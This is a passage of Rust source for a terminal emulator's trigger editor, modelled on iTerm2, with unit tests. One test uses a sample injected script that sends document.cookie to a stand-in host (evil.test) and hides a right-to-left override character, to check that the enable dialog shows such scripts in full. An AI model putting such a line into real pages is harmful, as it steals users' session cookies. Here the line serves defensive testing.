                        changed |= ui.add(egui::TextEdit::singleline(&mut t.regex).code_editor().char_limit(triggers::MAX_PATTERN).desired_width(360.0)).changed();
                        ui.end_row();
                        if browser && t.match_type == triggers::PAGE_CONTENT_REGEX {
                            let mut content = t.extra.get(CONTENT_REGEX_KEY).and_then(|v| v.as_str()).unwrap_or("").to_string();
                            ui.label(CONTENT_REGEX_LABEL);
                            if ui.add(egui::TextEdit::singleline(&mut content).code_editor().char_limit(triggers::MAX_PATTERN).desired_width(360.0)).changed() {
                                t.extra.insert(CONTENT_REGEX_KEY.into(), content.into());
                                changed = true;
                            }
                            ui.end_row();
                        }
                    }
                }
                ui.label("Job:");
                // Job Started and Job Ended name their job above (iTerm2 disables this field).
                let job_event = matches!(event, Some(crate::trigger_events::EventKind::JobStarted | crate::trigger_events::EventKind::JobEnded));
                let hint = if job_event { "Set job above" } else { "Trigger enabled only for this job (e.g., emacs)" };
                changed |= ui.add_enabled(!job_event, egui::TextEdit::singleline(&mut t.job).hint_text(hint).desired_width(360.0)).changed();
                ui.end_row();
                ui.label("Action:");
                let current = if browser {
                    triggers::browser_action_info(&t.action).map_or_else(|| crate::inert_files::display_text(&t.action, 80, false), action_label)
                } else {
                    triggers::action_info(&t.action).map_or_else(|| t.action.clone(), action_label)
                };
                egui::ComboBox::from_id_salt("trigger-action").selected_text(current).width(260.0).show_ui(ui, |ui| {
                    if browser {
                        for a in triggers::BROWSER_CATALOG {
                            if ui.selectable_label(triggers::browser_action_info(&t.action).is_some_and(|c| c.class == a.class), action_label(a)).clicked() {
                                pick_browser_action(t, a.class, interpolated, workgroups);
                                changed = true;
                            }
                        }
                    }
                    for a in if browser { &[][..] } else { triggers::CATALOG } {
                        if ui.selectable_label(triggers::action_info(&t.action).is_some_and(|c| c.class == a.class), action_label(a)).clicked() {
                            t.action = a.class.to_string();
                            t.parameter = match a.kind {
                                Kind::Popup(p) => p[0].1.to_string(),
                                // The first workgroup by name: what the pop-up shows now.
                                Kind::Workgroup => triggers::effective_workgroup("", workgroups).unwrap_or_default(),
                                _ => String::new(),
                            };
                            // A match the new action cannot use (Session Ended for a workgroup action) goes.
                            if !triggers::allows_match_type(&t.action, t.match_type) {
                                t.match_type = 0;
                            }
                            changed = true;
                        }
                    }
                });
                ui.end_row();
                ui.label("Parameters:");
                match if browser { triggers::browser_action_info(&t.action) } else { triggers::action_info(&t.action) } {
                    Some(info) => changed |= parameter(ui, info, &mut t.parameter, workgroups),
                    None => changed |= ui.add(egui::TextEdit::singleline(&mut t.parameter).char_limit(triggers::MAX_PARAMETER)).changed(),
                }
                ui.end_row();
                // Exit Workgroup's own option (`hasLeaderOnlyOption`): kept in the event params, only when on.
                if triggers::action_info(&t.action).is_some_and(|a| a.leader_only_option) {
                    ui.label("");
                    let mut params = t.extra.get("eventParams").and_then(|v| v.as_table()).cloned().unwrap_or_default();
                    let mut on = params.get(triggers::LEADER_ONLY_KEY).and_then(toml::Value::as_bool).unwrap_or(false);
                    let r = ui.checkbox(&mut on, "Only on the workgroup leader").on_hover_text("When set, the trigger fires only for the workgroup leader (the session that originally entered the workgroup). Peers such as the Code Review and Diff sessions do not, so reloading or quitting one keeps the workgroup open.");
                    if r.changed() {
                        if on {
                            params.insert(triggers::LEADER_ONLY_KEY.into(), toml::Value::Boolean(true));
                        } else {
                            params.remove(triggers::LEADER_ONLY_KEY);
                        }
                        t.extra.insert("eventParams".into(), toml::Value::Table(params));
                        changed = true;
                    }
                    ui.end_row();
                }
                ui.label("");
                ui.horizontal(|ui| {
                    if !browser {
                        changed |= ui.checkbox(&mut t.instant, "Instant").changed();
                    }
                    let was = t.enabled;
                    if ui.checkbox(&mut t.enabled, "Enabled").changed() {
                        if !was && enable_warning(t, workgroups).is_some() {
                            // Turning on a script, reload or workgroup trigger asks first; nothing runs here.
                            t.enabled = false;
                            ui.data_mut(|d| {
                                d.insert_temp(confirm_id, i);
                                d.remove::<usize>(egui::Id::new("trigger-confirm-read"));
                            });
                        } else {
                            changed = true;
                        }
                    }
                });
                ui.end_row();
            });
            // The one confirm: what the trigger will do, and Turn On or Cancel.
            if ui.data(|d| d.get_temp::<usize>(confirm_id)) == Some(i) {
                let read_id = egui::Id::new("trigger-confirm-read");
                match enable_warning(t, workgroups) {
                    Some(text) => {
                        ui.group(|ui| {
                            ui.colored_label(egui::Color32::from_rgb(0xff, 0xb0, 0x40), text);
                            // The whole script, scrollable; Turn On waits until its end was in view.
                            let mut read = true;
                            if let Some(script) = enable_script(t) {
                                let out = egui::ScrollArea::vertical().id_salt(("trigger-confirm-script", i)).max_height(200.0).auto_shrink([false, true]).show(ui, |ui| ui.add(egui::Label::new(egui::RichText::new(script).monospace()).wrap()));
                                let at_end = out.state.offset.y + out.inner_rect.height() + 1.0 >= out.content_size.y;
                                if at_end {
                                    ui.data_mut(|d| d.insert_temp(read_id, i));
                                }
                                read = ui.data(|d| d.get_temp::<usize>(read_id)) == Some(i);
                                if !read {
                                    ui.weak("Scroll to the end of the script to turn it on.");
                                }
                            }
                            ui.horizontal(|ui| {
                                if ui.add_enabled(read, egui::Button::new("Turn On")).clicked() {
                                    t.enabled = true;
                                    changed = true;
                                    ui.data_mut(|d| d.remove::<usize>(confirm_id));
                                    ui.data_mut(|d| d.remove::<usize>(read_id));
                                }
                                if ui.button("Cancel").clicked() {
                                    ui.data_mut(|d| d.remove::<usize>(confirm_id));
                                    ui.data_mut(|d| d.remove::<usize>(read_id));
                                }
                            });
                        });
                    }
                    None => ui.data_mut(|d| d.remove::<usize>(confirm_id)),
                }
            }
            if let (false, 0, Err(e)) = (browser, t.match_type, fancy_regex::Regex::new(&t.regex)) {
                ui.colored_label(egui::Color32::from_rgb(0xff, 0x6b, 0x6b), format!("This expression does not compile, so the trigger never fires: {e}"));
            }
            // An interpolated parameter that cannot be evaluated (iTerm2: Error in Trigger Parameter).
            if interpolated && t.parameter.contains("\\(") {
                if let Err(e) = crate::interp::check(&t.parameter) {
                    ui.colored_label(egui::Color32::from_rgb(0xff, 0x6b, 0x6b), format!("Error in Trigger Parameter: {e}"));
                }
            }
        }
    }
    ui.data_mut(|d| match selected {
        Some(i) => {
            d.insert_temp(sel_id, i);
        }
        None => d.remove::<usize>(sel_id),
    });
    if changed && !imported {
        // Entries the list could not read stay in place; untouched triggers stay as stored.
        let stored = profile.get("Triggers");
        profile.set("Triggers", triggers::merge_list(stored.as_ref(), &list));
    }
    changed || imported
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::triggers::Trigger;
    use alacritty_terminal::vte::ansi::Rgb;

    fn trig(name: &str, regex: &str, action: &str, parameter: &str) -> Trigger {
        Trigger { regex: regex.into(), action: action.into(), parameter: parameter.into(), instant: false, enabled: true, name: name.into(), job: String::new(), match_type: 0, extra: toml::Table::new() }
    }

    #[test]
    fn editor_rows_follow_iterm2() {
        let mut t = trig("errors", "err", "HighlightTrigger", "{#ff0000,}");
        let r = row(&t);
        assert_eq!((r.name.as_str(), r.detail.as_str(), r.faint), ("errors", "/err/ Highlight Text\u{2026} {#ff0000,}", false));
        t.job = "vim".into();
        t.instant = true;
        t.enabled = false;
        let r = row(&t);
        assert_eq!(r.detail, "Instant. Job: vim /err/ Highlight Text\u{2026} {#ff0000,}");
        assert!(r.faint, "disabled rows are faint");
        assert_eq!(row(&trig("", "x", "CaptureTrigger", "")).detail, "/x/ Capture Output");
        assert_eq!(row(&trig("", "x", "NoSuch", "")).detail, "/x/ NoSuch (not in Termurion)");
        assert_eq!(action_label(crate::triggers::action_info("iTermEnterWorkgroupTrigger").unwrap()), "Enter Workgroup\u{2026}");
        let ew = trig("", "x", "iTermEnterWorkgroupTrigger", "gid");
        assert_eq!(row_with(&ew, &[("gid".into(), "Chat".into())]).detail, "/x/ Enter Workgroup\u{2026} Chat", "the workgroup's name, never its id");
        assert_eq!(row_with(&ew, &[]).detail, "/x/ Enter Workgroup\u{2026} (missing)");
        let mut ev = trig("", "", "BellTrigger", "");
        ev.match_type = 105;
        assert_eq!(row(&ev).detail, "Event: Idle (Silence) Ring Bell");
        ev.match_type = 113;
        assert_eq!(row(&ev).detail, "Event: Job Started Ring Bell");
    }

    #[test]
    fn parameter_encodings_round_trip() {
        let red = Rgb { r: 255, g: 0, b: 0 };
        assert_eq!(two_colors(Some(red), None), "{#ff0000,}");
        assert_eq!(crate::trigger_eval::highlight_colors(&two_colors(Some(red), Some(red))), (Some(red), Some(red)));
        assert_eq!(two_strings("name", "value"), "name\u{1}value");
        assert_eq!(split_two("name\u{1}value"), ("name".to_string(), "value".to_string()));
        assert_eq!(split_two("only"), ("only".to_string(), String::new()));
        assert_eq!(tab_status("#00ff00", "#ffffff", "work"), "#00ff00\u{1}#ffffff\u{1}work");
        assert_eq!(split_tab_status("#00ff00\u{1}#ffffff\u{1}work"), ("#00ff00".to_string(), "#ffffff".to_string(), "work".to_string()));
        assert_eq!(setting("Silence Bell", true), "Silence Bell\u{1}1");
        assert_eq!(split_setting("Silence Bell\u{1}0"), ("Silence Bell".to_string(), false));
    }

    /// T9 m3: the editor's Import says how many triggers came in turned off.
    #[test]
    fn editor_import_says_how_many_came_in_off() {
        let run = toml::Table::from_iter([("action".to_string(), "ScriptTrigger".into()), ("regex".to_string(), "x".into()), ("parameter".to_string(), "echo".into())]);
        let c = crate::trigger_file::canonical(&run).unwrap();
        let files = vec![("x.it2triggers".to_string(), Ok(crate::trigger_file::export_text(std::slice::from_ref(&c))))];
        let (merged, alerts) = import_into(None, &files);
        assert_eq!(merged.as_array().unwrap()[0].as_table().unwrap().get("disabled").and_then(toml::Value::as_bool), Some(true));
        assert_eq!(alerts, vec![(crate::trigger_file::IMPORTED_OFF_HEADING.to_string(), crate::trigger_file::off_text(1))]);
    }

    #[test]
    fn editor_import_merges_files_and_reports_failures() {
        let alert = |r: &str| toml::Table::from_iter([("action".to_string(), "AlertTrigger".into()), ("regex".to_string(), r.into()), ("parameter".to_string(), "hi".into())]);
        let a = crate::trigger_file::canonical(&alert("a")).unwrap();
        let c = crate::trigger_file::canonical(&alert("c")).unwrap();
        let stored = toml::Value::Array(vec![a.clone().into()]);
        let files = vec![("x.it2triggers".to_string(), Ok(crate::trigger_file::export_text(std::slice::from_ref(&c)))), ("y.it2triggers".to_string(), Err("denied".to_string()))];
        let (merged, alerts) = import_into(Some(&stored), &files);
        assert_eq!(merged, toml::Value::Array(vec![a.into(), c.into()]));
        assert_eq!(alerts, vec![("Import Failed".to_string(), "While loading y.it2triggers: denied".to_string())]);
        let bad = vec![("z.it2triggers".to_string(), Ok("5".to_string()))];
        let (kept, alerts) = import_into(Some(&stored), &bad);
        assert_eq!(kept, stored, "a file that failed adds nothing");
        assert_eq!(alerts, vec![("Import Failed".to_string(), "Malformed file at z.it2triggers".to_string())]);
    }

    #[test]
    fn browser_editor_follows_iterm2() {
        let white = Rgb { r: 255, g: 255, b: 255 };
        let red = Rgb { r: 255, g: 0, b: 0 };
        assert_eq!(match_types(true), vec![("Regular Expression", 0), ("URL", 1), ("Page Content", 2)]);
        let t = match_types(false);
        assert_eq!(t[0], ("Regular Expression", 0));
        assert!(t.iter().all(|(n, _)| *n != "URL" && *n != "Page Content"));
        assert!(!match_type_enabled("InjectJavascriptURLTrigger"));
        for a in triggers::BROWSER_CATALOG {
            assert!(!match_type_enabled(a.class), "{}", a.class);
        }
        assert!(match_type_enabled("BounceTrigger"));
        assert_eq!(regex_label(true, 2), "URL Regex:");
        assert_eq!(regex_label(true, 1), "Regular Expression:");
        assert_eq!(regex_label(false, 2), "Regular Expression:");
        assert_eq!((CONTENT_REGEX_LABEL, CONTENT_REGEX_KEY), ("Content Regex:", "contentregex"));
        let d = browser_default();
        assert_eq!((d.action.as_str(), d.regex.as_str(), d.match_type, d.enabled), ("iTerm2SharedARC.ReaderModeBrowserTrigger", "", 0, true));
        assert_eq!(browser_colors_param(Some(white), Some(red)), "#ffffff;#ff0000");
        assert_eq!(browser_colors_param(None, Some(red)), ";#ff0000");
        assert_eq!(browser_colors_param(Some(white), None), "#ffffff;");
        let mut t = trig("", "", "iTerm2SharedARC.ReaderModeBrowserTrigger", "");
        pick_browser_action(&mut t, "iTerm2SharedARC.HighlightBrowserTrigger", false, &[]);
        assert_eq!((t.match_type, t.parameter.as_str()), (2, "#ffffff;#ff0000"));
        pick_browser_action(&mut t, "ReloadBrowserTrigger", false, &[]);
        assert_eq!((t.match_type, t.parameter.as_str()), (1, "60"));
        pick_browser_action(&mut t, "InjectJavascriptContentTrigger", false, &[]);
        assert_eq!((t.match_type, t.parameter.as_str()), (2, "console.log('Testing');"));
        pick_browser_action(&mut t, "iTerm2SharedARC.HyperlinkBrowserTrigger", false, &[]);
        assert_eq!(t.parameter, "https://\\0");
        pick_browser_action(&mut t, "iTerm2SharedARC.HyperlinkBrowserTrigger", true, &[]);
        assert_eq!(t.parameter, "https://\\(match0)");
        let mut c = trig("", "y", "iTerm2SharedARC.HighlightBrowserTrigger", "#ffffff;#ff0000");
        c.match_type = 2;
        c.extra.insert(CONTENT_REGEX_KEY.into(), "x".into());
        assert_eq!(browser_row(&c).detail, "/y/ /x/ Highlight Text Text: #ffffff Background: #ff0000");
        assert_eq!(row(&c).detail, browser_row(&c).detail, "row describes browser triggers");
        let back = Trigger::from_table(&c.to_table());
        assert_eq!(back.extra.get(CONTENT_REGEX_KEY).and_then(|v| v.as_str()), Some("x"));
        let mut u = trig("n", "u", "ReloadBrowserTrigger", "30");
        u.match_type = 1;
        assert_eq!(browser_row(&u).detail, "/u/ Reload After Delay 30");
        u.instant = true;
        u.job = "j".into();
        assert!(!browser_row(&u).detail.contains("Instant"));
    }

    #[test]
    fn browser_editor_is_safe() {
        // Picking a script, reload or workgroup action leaves the trigger off until the person confirms.
        for class in ["InjectJavascriptContentTrigger", "InjectJavascriptURLTrigger", "ReloadBrowserTrigger", "iTermEnterWorkgroupBrowserTrigger", "iTermExitWorkgroupBrowserTrigger"] {
            let mut t = trig("", "", "iTerm2SharedARC.HighlightBrowserTrigger", "");
            pick_browser_action(&mut t, class, false, &[]);
            assert!(!t.enabled, "{class}");
            assert!(enable_warning(&t, &[]).is_some(), "{class}");
        }
        let mut h = trig("", "", "iTerm2SharedARC.ReaderModeBrowserTrigger", "");
        pick_browser_action(&mut h, "iTerm2SharedARC.HighlightBrowserTrigger", false, &[]);
        assert!(h.enabled && enable_warning(&h, &[]).is_none());
        // The warning never hides part of a script: the confirm's scroll area holds all of it (I1), without
        // hidden characters and with its line breaks, and the text says how long it is.
        let long = format!("// harmless\nalert(1);\u{202e}\n{}\nfetch('https://evil.test/' + document.cookie);", "x".repeat(5000));
        let mut s = trig("", "^https://a/", "InjectJavascriptURLTrigger", &long);
        s.match_type = 1;
        let w = enable_warning(&s, &[]).unwrap();
        assert!(w.contains("^https://a/") && !w.contains('\u{202e}') && w.chars().count() < 1500);
        assert!(w.contains(&format!("{} characters, all of it shown", long.chars().count())));
        let script = enable_script(&s).unwrap();
        assert!(script.contains("alert(1);\n") && script.ends_with("document.cookie);") && !script.contains('\u{202e}'), "the end of a long script is shown");
        assert_eq!(script.chars().count(), long.chars().count() - 1, "only the hidden character is dropped");
        assert!(enable_script(&trig("", "", "ReloadBrowserTrigger", "5")).is_none());
        // Enter Workgroup names its target (I2); an empty regex reads as every page (M2).
        let wg = vec![("id-1".to_string(), "Build\u{202e}box".to_string())];
        let mut e = trig("", "", "iTermEnterWorkgroupBrowserTrigger", "id-1");
        e.match_type = 1;
        let ew = enable_warning(&e, &wg).unwrap();
        assert!(ew.contains("\u{201c}Buildbox\u{201d}") && ew.contains("on every page."), "{ew}");
        assert!(enable_warning(&e, &[]).unwrap().contains("(missing)"));
        // A hostile name or regex is shown through display_text.
        let mut n = trig("", "a\u{202e}b", "ReloadBrowserTrigger", "5");
        n.match_type = 1;
        assert!(!browser_row(&n).detail.contains('\u{202e}'));
    }

    #[cfg(windows)]
    #[test]
    fn export_writes_owner_only_and_replaces() {
        let dir = std::env::temp_dir().join(format!("termurion-export-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let file = crate::localfs::LocalPath::judge(dir.join("t.it2triggers")).expect("a local path");
        write_export(&file, "[1]").unwrap();
        write_export(&file, "[2]").unwrap();
        assert_eq!(std::fs::read_to_string(file.path()).unwrap(), "[2]");
        let names: Vec<_> = std::fs::read_dir(&dir).unwrap().map(|e| e.unwrap().file_name()).collect();
        assert_eq!(names.len(), 1, "no temporary file stays: {names:?}");
        let sddl = crate::localfs::dacl_sddl(&file.parent().unwrap().unfollowed("t.it2triggers").unwrap()).unwrap();
        assert!(sddl.contains("D:P(A;;FA;;;"), "owner-only: {sddl}");
        let _ = std::fs::remove_dir_all(&dir);
    }
}
